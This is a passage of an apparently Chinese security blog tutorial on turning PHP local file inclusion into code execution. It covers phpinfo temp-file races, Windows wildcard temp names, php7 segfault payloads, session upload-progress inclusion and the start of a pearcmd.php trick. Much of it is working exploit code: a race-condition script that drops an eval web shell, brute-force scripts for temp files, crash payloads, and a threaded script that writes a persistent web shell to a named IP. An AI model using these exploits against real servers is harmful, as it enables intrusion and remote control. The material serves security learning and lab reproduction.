+&lt;?php $c=fopen(&#39;C:\Windows\Temp\dd.php&#39;,&#39;w&#39;);fwrite($c,&#39;&lt;?php eval($_REQUEST[HY]);?&gt;&#39;);?&gt;\r&quot;&quot;&quot; % TAG
+    REQ1_DATA=&quot;&quot;&quot;-----------------------------7dbff1ded0714\r
+Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r
+Content-Type: text/plain\r
+\r
+%s
+-----------------------------7dbff1ded0714--\r&quot;&quot;&quot; % PAYLOAD
+    padding=&quot;A&quot; * 5000
+    # 这里需要修改为phpinfo.php的地址
+    REQ1=&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;+padding+&quot;&quot;&quot; HTTP/1.1\r
+Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+HTTP_ACCEPT: &quot;&quot;&quot; + padding + &quot;&quot;&quot;\r
+HTTP_USER_AGENT: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+HTTP_PRAGMA: &quot;&quot;&quot;+padding+&quot;&quot;&quot;\r
+Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
+Content-Length: %s\r
+Host: %s\r
+\r
+%s&quot;&quot;&quot; %(len(REQ1_DATA),host,REQ1_DATA)
+    #modify this to suit the LFI script
+    LFIREQ=&quot;&quot;&quot;GET /index.php?file=%s HTTP/1.1\r
+User-Agent: Mozilla/4.0\r
+Proxy-Connection: Keep-Alive\r
+Host: %s\r
+\r
+\r
+&quot;&quot;&quot;
+    return (REQ1, TAG, LFIREQ)
+
+def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    s.connect((host, port))
+    s2.connect((host, port))
+
+    s.send(phpinforeq)
+    d = &quot;&quot;
+    while len(d) &lt; offset:
+        d += s.recv(offset)
+    try:
+        i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)
+        fn = d[i+17:i+39]
+        print fn
+    except ValueError:
+        return None
+    s2.send(lfireq % (fn, host))
+    # print lfireq % (fn, host) #debug调试结果
+    d = s2.recv(4096)
+    # print d #查看回显是否成功
+    s.close()
+    s2.close()
+
+    if d.find(tag) != -1:
+        return fn
+
+counter=0
+class ThreadWorker(threading.Thread):
+    def __init__(self, e, l, m, *args):
+        threading.Thread.__init__(self)
+        self.event = e
+        self.lock =  l
+        self.maxattempts = m
+        self.args = args
+
+    def run(self):
+        global counter
+        while not self.event.is_set():
+            with self.lock:
+                if counter &gt;= self.maxattempts:
+                    return
+                counter+=1
+
+            try:
+                x = phpInfoLFI(*self.args)
+                if self.event.is_set():
+                    break
+                if x:
+                    print &quot;\nGot it! Shell created in /tmp/g&quot;
+                    self.event.set()
+
+            except socket.error:
+                return
+
+
+def getOffset(host, port, phpinforeq):
+    &quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host,port))
+    s.send(phpinforeq)
+
+    d = &quot;&quot;
+    while True:
+        i = s.recv(4096)
+        d+=i
+        if i == &quot;&quot;:
+            break
+        # detect the final chunk
+        if i.endswith(&quot;0\r\n\r\n&quot;):
+            break
+    s.close()
+    i = d.find(&quot;[tmp_name] =&amp;gt; &quot;)
+    if i == -1:
+        raise ValueError(&quot;No php tmp_name in phpinfo output&quot;)
+
+    print &quot;found %s at %i&quot; % (d[i:i+10],i)
+    # padded up a bit
+    return i+256
+
+def main():
+
+    print &quot;LFI With PHPInfo()&quot;
+    print &quot;-=&quot; * 30
+
+    if len(sys.argv) &lt; 2:
+        print &quot;Usage: %s host [port] [threads]&quot; % sys.argv[0]
+        sys.exit(1)
+
+    try:
+        host = socket.gethostbyname(sys.argv[1])
+    except socket.error, e:
+        print &quot;Error with hostname %s: %s&quot; % (sys.argv[1], e)
+        sys.exit(1)
+
+    port=80
+    try:
+        port = int(sys.argv[2])
+    except IndexError:
+        pass
+    except ValueError, e:
+        print &quot;Error with port %d: %s&quot; % (sys.argv[2], e)
+        sys.exit(1)
+
+    poolsz=10
+    try:
+        poolsz = int(sys.argv[3])
+    except IndexError:
+        pass
+    except ValueError, e:
+        print &quot;Error with poolsz %d: %s&quot; % (sys.argv[3], e)
+        sys.exit(1)
+
+    print &quot;Getting initial offset...&quot;,
+    reqphp, tag, reqlfi = setup(host, port)
+    offset = getOffset(host, port, reqphp)
+    sys.stdout.flush()
+
+    maxattempts = 1000
+    e = threading.Event()
+    l = threading.Lock()
+
+    print &quot;Spawning worker pool (%d)...&quot; % poolsz
+    sys.stdout.flush()
+
+    tp = []
+    for i in range(0,poolsz):
+        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))
+
+    for t in tp:
+        t.start()
+    try:
+        while not e.wait(1):
+            if e.is_set():
+                break
+            with l:
+                sys.stdout.write( &quot;\r% 4d / % 4d&quot; % (counter, maxattempts))
+                sys.stdout.flush()
+                if counter &gt;= maxattempts:
+                    break
+        print
+        if e.is_set():
+            print &quot;Woot!  \m/&quot;
+        else:
+            print &quot;:(&quot;
+    except KeyboardInterrupt:
+        print &quot;\nTelling threads to shutdown...&quot;
+        e.set()
+
+    print &quot;Shuttin&#39; down...&quot;
+    for t in tp:
+        t.join()
+
+if __name__==&quot;__main__&quot;:
+    main()
+</code></pre>
+<p><strong>记得，一定要修改切片位置，不然哭死</strong></p>
+<pre><code class="shell">python2 exp.py 127.0.0.1 80 200
+</code></pre>
+<p>然后成功在目录找到了这个文件</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221127022812771.png" alt="image-20221127022812771"></p>
+<h3 id="Windows-通配符妙用"><a href="#Windows-通配符妙用" class="headerlink" title="Windows 通配符妙用"></a>Windows 通配符妙用</h3><p><code>phpinfo-LFI 本地文件包含临时文件getshell</code>中的利用方法需要两个条件：</p>
+<ol>
+<li>存在phpinfo等可以泄露临时文件名的页面</li>
+<li>网络条件好，才能让Race Condition成功</li>
+</ol>
+<p>特别是第一个，现在很少有机会让我们在实战中找到phpinfo页面。但是如果目标操作系统是Windows，我们可以借助一些特殊的Tricks来实现文件包含的利用。</p>
+<p>PHP在读取Windows文件时，会使用到<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfileexw">FindFirstFileExW</a>这个Win32 API来查找文件，而这个API是支持使用通配符的：</p>
+<blockquote>
+<p><strong>lpFileName</strong></p>
+<p>The directory or path, and the file name. The file name can include  wildcard characters, for example, an asterisk (*) or a question mark  (?).</p>
+</blockquote>
+<p>实际测试下来，PHP中星号和问号并不能直接作为通配符使用。</p>
+<p>但我们在<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-_fsrtl_advanced_fcb_header-fsrtlisnameinexpression">MSDN官方文档</a>中还可以看到这样的说明：</p>
+<blockquote>
+<p>The following wildcard characters can be used in the pattern string.</p>
+<p>Wildcard character  Meaning</p>
+<p>***** (asterisk)               Matches zero or more characters.</p>
+<p><strong>?</strong> (question mark)   Matches a single character.</p>
+<p><strong>DOS_DOT</strong>                 Matches either a period or zero characters beyond the name string.</p>
+<p><strong>DOS_QM</strong>                  Matches any single character or, upon encountering a period or end of name string, advances the  expression to the end of the set of contiguous DOS_QMs.</p>
+<p><strong>DOS_STAR</strong>               Matches zero or more characters until encountering and matching the final . in the name.</p>
+</blockquote>
+<p>其中除了星号和问号外，还提到了三个特殊符号DOS_DOT、DOS_QM、DOS_STAR，虽然官方并没有在文档中给出他们对应的值具体是什么，但在ntifs.h头文件中还是能找到他们的定义：</p>
+<pre><code>//  The following constants provide addition meta characters to fully
+//  support the more obscure aspects of DOS wild card processing.
+
+#define DOS_STAR        (L&#39;&lt;&#39;)
+#define DOS_QM          (L&#39;&gt;&#39;)
+#define DOS_DOT         (L&#39;&quot;&#39;)
+</code></pre>
+<p>也就是说：</p>
+<ul>
+<li>DOS_STAR：即 <code>&lt;</code>，匹配0个以上的字符</li>
+<li>DOS_QM：即<code>&gt;</code>，匹配1个字符</li>
+<li>DOS_DOT：即<code>&quot;</code>，匹配点号</li>
+</ul>
+<p>这样，我们在Windows下，可以使用上述通配符来替代临时文件名中的随机字符串：<code>C:\Windows\Temp\php&lt;&lt;</code>。（由于Windows内部的一些不太明确的原因，这里一般需要用两个<code>&lt;</code>来匹配多个字符）</p>
+<p>我们直接向含有文件包含漏洞的页面发送一个上传包：</p>
+<p>表单如下:</p>
+<pre><code class="html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;form action=&quot;http://127.0.0.1/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;file&quot; value=&quot;c:\Windows\php&lt;&lt;&quot; /&gt;
+    &lt;input type=&quot;file&quot; name=&quot;upload&quot; /&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>然后上传一个我们想要执行代码的php文件</p>
+<p>我们抓包来看一看</p>
+<pre><code>POST /index.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------176135873113704889614062296004
+Content-Length: 380
+Origin: null
+Connection: close
+Cookie: PHPSESSID=6kbm9g1n6ao8r98ljcmkbeade1; role=czo1OiJhZG1pbiI7
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+
+-----------------------------176135873113704889614062296004
+Content-Disposition: form-data; name=&quot;file&quot;
+
+C:\Windows\php&lt;&lt;
+-----------------------------176135873113704889614062296004
+Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;lfi.php&quot;
+Content-Type: application/octet-stream
+
+&lt;?php
+echo md5(1);
+-----------------------------176135873113704889614062296004--
+</code></pre>
+<p>然后多发几次</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130191917085.png" alt="image-20221130191917085"></p>
+<p>我们可以看到成功执行了我们发送的恶意文件代码，成功率还是相当之高的</p>
+<h3 id="LFI-php7-Segment-Fault-Getshell"><a href="#LFI-php7-Segment-Fault-Getshell" class="headerlink" title="LFI + php7 Segment Fault Getshell"></a>LFI + php7 Segment Fault Getshell</h3><p> 段错误（segment fault）就是指访问的内存超过了系统所给这个程序的内存空间。从而发生程序退出。缓存文件就留在了<strong>tmp目录</strong><br> 向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p>
+<p><strong>让PHP异常崩溃的payload：</strong><br>7.0.0 &lt;=  php &lt;  7.1.20</p>
+<pre><code class="php">php://filter/string.strip_tags/resource=/etc/passwd
+</code></pre>
+<p>php7 老版本通杀</p>
+<pre><code class="php">php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA
+</code></pre>
+<p><strong>这种包含会导致php执行过程中出现segment fault，此时上传文件，临时文件会被保存在<code>upload_tmp_dir</code>所指定的目录下，不会被删除,这样就能达成getshell的目的</strong></p>
+<p><strong>windows复现</strong></p>
+<p>我们在请求的同时post一个文件</p>
+<pre><code class="php">POST /index.php?file=php://filter/string.strip_tags/resource=index.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------176135873113704889614062296004
+Content-Length: 216
+Origin: null
+Connection: close
+Cookie: PHPSESSID=6kbm9g1n6ao8r98ljcmkbeade1; role=czo1OiJhZG1pbiI7
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+
+-----------------------------176135873113704889614062296004
+Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;lfi.php&quot;
+
+&lt;?php
+phpinfo();
+?&gt;
+-----------------------------176135873113704889614062296004--
+</code></pre>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130200709385.png" alt="image-20221130200709385"></p>
+<p>然后我们来查看一下目录:</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130200817102.png" alt="image-20221130200817102"></p>
+<p>这个文件确实保留在了服务器当中,现在假设我们知道了它的名字，来尝试包含它</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130200947378.png" alt="image-20221130200947378"></p>
+<p>good!成功包含</p>
+<p>如果我们不知道它的名字呢?那就只能爆破了,但是我们可以多上传一些这种文件，来增加爆破成功的几率</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130201135494.png" alt="image-20221130201135494"></p>
+<p>好，我们来写个脚本来爆破，只有第4-7位是未知的，所以windows相对来说更好爆破</p>
+<p>爆破脚本:</p>
+<pre><code class="python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import requests
+import string
+
+charset = string.digits + string.ascii_letters  # 最好是多发几个，然后只取数字和字母不然效率真的很低
+
+host = &quot;127.0.0.1&quot;
+port = 80
+base_url = &quot;http://%s:%d&quot; % (host, port)
+
+
+def brute_force_tmp_files():
+    for i in charset:
+        for j in charset:
+            for k in charset:
+                for l in charset:
+                        filename = i + j + k + l
+                        url = &quot;%s/index.php?file=C:/windows/php%s&quot; % (
+                            base_url, filename)+&quot;.tmp&quot;
+                        print (url)
+                        try:
+                            response = requests.get(url)
+                            if &#39;flag&#39; in response.text:
+                                print (&quot;[+] Include success!&quot;)
+                                return True
+                        except Exception as e:
+                            print (e)
+    return False
+
+def main():
+    brute_force_tmp_files()
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130202336196.png" alt="image-20221130202336196"></p>
+<p>就这样跑下去</p>
+<p>不过的话这样跑起来实在是太慢了,我们可以多发点包，然后呢，只取数字或者字母(经常测试会生成不少这样的tmp文件)，这样的话范围大大缩小，效率也提高了不少.</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130203124465.png" alt="image-20221130203124465"></p>
+<p>如图，我们很快就跑了出来，来包含一下</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130203214124.png" alt="image-20221130203214124"></p>
+<p>成功包含! 还是很有实战意义的</p>
+<p><strong>Linux复现</strong></p>
+<p>Linux其实也是一样的，不过与windows不同</p>
+<pre><code> linux生成的文件是  php+六位随机数字字母 如:/tmp/php5H1Lku
+</code></pre>
+<p>所以爆破难度实质上增加了不少，脚本我们也改一改就能用，建议实战的时候多发点包来增加成功率</p>
+<pre><code class="python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import requests
+import string
+
+charset = string.digits + string.letters
+
+host = &quot;192.168.1.9&quot;
+port = 8000
+base_url = &quot;http://%s:%d&quot; % (host, port)
+
+
+def brute_force_tmp_files():
+    for i in charset:
+        for j in charset:
+            for k in charset:
+                for l in charset:
+                    for m in charset:
+                        for n in charset:
+                            filename = i + j + k + l + m + n
+                            url = &quot;%s/index.php?orange=/tmp/php%s&quot; % (
+                                base_url, filename)
+                            print url
+                            try:
+                                response = requests.get(url)
+                                if &#39;flag&#39; in response.content:
+                                    print &quot;[+] Include success!&quot;
+                                    return True
+                            except Exception as e:
+                                print e
+    return False
+
+def main():
+    brute_force_tmp_files()
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<h3 id="利用session进行文件包含来getshell"><a href="#利用session进行文件包含来getshell" class="headerlink" title="利用session进行文件包含来getshell"></a>利用session进行文件包含来getshell</h3><p><strong>SESSION会话存储方式</strong></p>
+<p>在<code>Java</code>中，用户的session是存储在内存中的，而在<code>PHP</code>中，则是将session以文件的形式存储在服务器某个文件中，我们可以在<code>php.ini</code>里面设置<code>session</code>的存储位置<code>session.save_path</code></p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129151954937.png" alt="image-20221129151954937"></p>
+<p>在很多时候服务器都是按照默认设置来运行的，假如我们发现了一个没有安全措施的<code>session</code>文件包含漏洞时，我们就可以尝试利用默认的会话存放路径去包含<code>getshell</code>，因此总结常见的<code>php-session</code>的默认存储位置是很有必要的</p>
+<p><strong>默认路径</strong></p>
+<pre><code class="php">/var/lib/php/sess_PHPSESSID
+/var/lib/php5/sess_PHPSESSID
+/var/lib/php7/sess_PHPSESSID
+/var/lib/php/sessions/sess_PHPSESSID
+/tmp/sess_PHPSESSID
+/tmp/sessions/sess_PHPSESSID
+</code></pre>
+<blockquote>
+<blockquote>
+<p><code>session</code>文件的存储路径是分为两种情况的</p>
+<p>一是没有权限，默认存储在<code>/var/lib/php/sessions/</code>目录下，文件名为<code>sess_[phpsessid]</code>，而<code>phpsessid</code>在发送的请求的<code>cookie</code>字段中可以看到（一般在利用漏洞时我们自己设置<code>phpsessid</code>）</p>
+<p>二是<code>phpmyadmin</code>，这时的<code>session</code>文件存储在<code>/tmp</code>目录下，需要在<code>php.ini</code>里把<code>session.auto_start</code>置为1，把<code>session.save_path</code>目录设置为<code>/tmp</code></p>
+</blockquote>
+</blockquote>
+<p><strong>涉及到的函数</strong></p>
+<p>1.Session Upload Progress</p>
+<p>默认情况下是开启的</p>
+<p><code>Session Upload Progress</code> 即 Session 上传进度，是<code>php&gt;=5.4</code>后开始添加的一个特性。官网对他的描述是当 <code>session.upload_progress.enabled</code> 选项开启时（默认开启），PHP 能够在每一个文件上传时 <strong>监测上传进度</strong>。这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个<code>POST</code>请求到终端（例如通过XHR）来检查这个状态。</p>
+<p>当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，上传进度可以在 <code>$_SESSION</code> 中获得。 当PHP检测到这种POST请求时，它会在 <code>$_SESSION</code> 中添加一组数据，索引是 <code>session.upload_progress.prefix</code> 与 <code>session.upload_progress.name</code> 连接在一起的值。</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129153107918.png" alt="image-20221129153107918"></p>
+<p>2.session.upload_progress.cleanup</p>
+<p>Cleanup the progress information as soon as all POST data has been read  (i.e. upload completed). Defaults to 1, enabled.  一旦POST请求被读取完成,session内容就会被清空</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129153427709.png" alt="image-20221129153427709"></p>
+<hr>
+<p><strong>配置环境</strong></p>
+<p>index.php</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+header(&quot;Content-Type: text/html; charset=utf-8&quot;);
+$file = $_GET[&#39;file&#39;];
+include($file);
+?&gt;
+</code></pre>
+<p>然后我们来监控下session目录</p>
+<pre><code>inotifywait -mrq -e &#39;create,delete,close_write,attrib,moved_to&#39; --timefmt &#39;%Y-%m-%d %H:%M&#39; --format &#39;%T %w%f %e&#39; /var/lib/php/sessions/
+</code></pre>
+<p><strong>攻击流程</strong></p>
+<p>1.构造上传表单</p>
+<pre><code class="html">&lt;form action=&quot;http://193.43.142.8/sakura.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
+ &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?php phpinfo();?&gt;&quot; /&gt;
+ &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt;
+ &lt;input type=&quot;file&quot; name=&quot;file2&quot; /&gt;
+ &lt;input type=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+</code></pre>
+<p>我们上传个文件来测试一下,随便选一个文件就好</p>
+<blockquote>
+<p>1.首先构造的表单里面是没有cookie的，所以要自己加上一个cookie，phpsessid随便设置一个就可以，他会创建名为sess_PHPSESSID的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。所以要知道文件名才能包含</p>
+<p>2.当同时POST一个与session.upload_process.name的同名变量也就是PHP_SESSION_UPLOAD_PROGRESS。后端会自动将POST的这个同名变量作为键进行序列化然后存储到session文件中。通俗说就是会把内容序列化传入到session储存的文件中。</p>
+</blockquote>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129221724271.png" alt="image-20221129221724271"></p>
+<p>我们可以看到已经产生sess_phpsessid文件了</p>
+<p>2.包含phpsessid文件Getshell(关闭session.upload_progress.cleanup)</p>
+<p>我们先来查看一下里面的内容,但是里面什么都没有</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129222707579.png" alt="image-20221129222707579"></p>
+<p>因为<code>session.upload_progress.cleanup</code>开启,读取完post内容时,session内容就会清空,所以我们需要用到条件竞争,一直发送请求,然后一直包含。</p>
+<p>我们先降低难度，把<code>session.upload_progress.cleanup</code>关闭来包含</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129223936145.png" alt="image-20221129223936145"></p>
+<p>来重新上传下文件</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129224017844.png" alt="image-20221129224017844"></p>
+<p>此时session里的内容并没有被删除</p>
+<p>我们来包含一下</p>
+<pre><code class="php">http://193.43.142.8/sakura.php?file=/var/lib/php/sessions/sess_uhbrr6s4fchgssstv9n8nbua0a
+</code></pre>
+<p>很显然我们包含成功了</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129224159121.png" alt="image-20221129224159121"></p>
+<p>3.包含phpsessid文件Getshell(开启session.upload_progress.cleanup)</p>
+<p>好的，那么接下来我们重新打开这个配置,然后将session置空，那么我们该如何包含这个迅速被置空的session文件呢?</p>
+<p>我们可以来利用条件竞争，简单来说就是我一边发包上传文件，一边去包含这个session文件，那么总有一个时间包含这个文件的操作是在清空session文件内容操作之前的!</p>
+<p>我们来操作一下，使用burp即可！</p>
+<p>我们分别抓一个上传文件的数据包，和一个文件包含的数据包,payload设置为空即可</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129225355419.png" alt="image-20221129225355419"></p>
+<p>然后我将上传文件的数据包设置为2500条，文件包含的数据包设为5000条</p>
+<p>好，let’s hack it!</p>
+<p>如图,已经成功包含了</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129230017592.png" alt="image-20221129230017592"></p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221129230055835.png" alt="image-20221129230055835"></p>
+<p>除了用burp,我们还可以直接跑python脚本</p>
+<pre><code class="python">import requests
+import io
+import threading
+
+url = &quot;http://193.43.142.8/sakura.php&quot;
+sessid = &quot;uhbrr6s4fchgssstv9n8nbua0a&quot;
+
+
+def write(session):
+    filebytes = io.BytesIO(b&#39;a&#39; * 1024 * 50)
+    while True:
+        res = session.post(url,
+                           data=&#123;
+                               &#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &quot;&lt;?php eval($_POST[1]);?&gt;&quot;
+                           &#125;,
+                           cookies=&#123;
+                               &#39;PHPSESSID&#39;: sessid
+                           &#125;,
+                           files=&#123;
+                               &#39;file&#39;: (&#39;sakura.jpg&#39;, filebytes)
+                           &#125;
+                           )
+
+
+def read(session):
+    while True:
+        res = session.post(url + &quot;?file=/var/lib/php/sessions/sess_&quot; + sessid,
+                           data=&#123;
+                               &quot;1&quot;: &quot;file_put_contents(&#39;/var/www/html/HY.php&#39; , &#39;&lt;?php eval($_POST[hy666]);?&gt;&#39;);&quot;
+                           &#125;,
+                           cookies=&#123;
+                               &quot;PHPSESSID&quot;: sessid
+                           &#125;
+                           )
+        res2 = session.get(&quot;http://193.43.142.8/HY.php&quot;)
+        if res2.status_code == 200:
+            print(&quot;成功写入一句话！&quot;)
+        else:
+            print(&quot;Retry&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    evnet = threading.Event()
+    with requests.session() as session:
+        for i in range(5):
+            threading.Thread(target=write, args=(session,)).start()
+        for i in range(5):
+            threading.Thread(target=read, args=(session,)).start()
+    evnet.set()
+</code></pre>
+<p>自己根据脚本修改对应文件就好啦</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130000436615.png" alt="image-20221130000436615"></p>
+<p>然后直接使用蚁剑连接:</p>
+<p><img src="/2022/11/23/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/image-20221130000707628.png" alt="image-20221130000707628"></p>
+<h3 id="pearcmd-php的巧妙利用"><a href="#pearcmd-php的巧妙利用" class="headerlink" title="pearcmd.php的巧妙利用"></a>pearcmd.php的巧妙利用</h3><p>这个点懒得搭环境了，就直接搬运了p神的文章</p>
+<p>最后这个是我想介绍的被我“捂烂了”的trick，就是利用<code>pearcmd.php</code>这个pecl/pear中的文件。</p>
+<p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。</p>
+<p>不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。</p>
+<p>原本pear/pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。</p>
+<p>我最早的时候是在阅读phpinfo()的过程中，发现Docker环境下的PHP会开启<code>register_argc_argv</code>这个配置。文档中对这个选项的介绍不是特别清楚，大概的意思是，当开启了这个选项，用户的输入将会被赋予给<code>$argc</code>、<code>$argv</code>、<code>$_SERVER[&#39;argv&#39;]</code>几个变量。</p>
+<p>如果PHP以命令行的形式运行（即sapi是cli），这里很好理解。但如果PHP以Server的形式运行，且又开启了<code>register_argc_argv</code>，那么这其中是怎么处理的？</p>
+<p>我们在PHP源码中可以看到这样的逻辑：</p>
+<pre><code class="php">static zend_bool php_auto_globals_create_server(zend_string *name)
+&#123;
+    if (PG(variables_order) &amp;&amp; (strchr(PG(variables_order),&#39;S&#39;) || strchr(PG(variables_order),&#39;s&#39;))) &#123;
+        php_register_server_variables();
+
+        if (PG(register_argc_argv)) &#123;
+            if (SG(request_info).argc) &#123;
+                zval *argc, *argv;
+
+                if ((argc = zend_hash_find_ex_ind(&amp;EG(symbol_table), ZSTR_KNOWN(ZEND_STR_ARGC), 1)) != NULL &amp;&amp;
+                    (argv = zend_hash_find_ex_ind(&amp;EG(symbol_table), ZSTR_KNOWN(ZEND_STR_ARGV), 1)) != NULL) &#123;
+                    Z_ADDREF_P(argv);
+                    zend_hash_update(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), ZSTR_KNOWN(ZEND_STR_ARGV), argv);
+                    zend_hash_update(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), ZSTR_KNOWN(ZEND_STR_ARGC), argc);
+                &#125;
+            &#125; else &#123;
+                php_build_argv(SG(request_info).query_string, &amp;PG(http_globals)[TRACK_VARS_SERVER]);
+            &#125;
+        &#125;
+
+    &#125; else &#123;
+        zval_ptr_dtor_nogc(&amp;PG(http_globals)[TRACK_VARS_SERVER]);
